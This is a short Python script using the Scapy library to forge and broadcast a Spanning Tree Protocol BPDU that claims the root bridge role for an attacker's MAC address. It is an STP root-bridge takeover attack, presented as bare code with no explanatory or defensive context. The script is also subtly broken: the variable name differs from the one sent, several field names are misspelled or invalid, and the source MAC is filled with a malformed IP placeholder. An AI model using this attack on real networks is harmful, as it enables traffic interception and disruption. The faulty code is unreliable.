from scapy.all import *

bdpu_ = (
            Ether(dst_="ff:ff:ff:ff:ff:ff", src_="<destination_IP_Address", type=0x0003) /
            LLC(dsap=0x42, ssap=0x42, ctrl=0x03) /
            STP(
                bppdutype=0x00,
                rootid=0x8000,
                rootmac="<Attackers_MAC_Address>",
                bridgemac="<Attackers_MAC_Address>",
                portid=0x8001,
                age=0,
                maxage=20,
                hellotime=2,
                fwddelay=15
            )
        ) 
sendp(bpdu, iface="eth0", verbose=True)
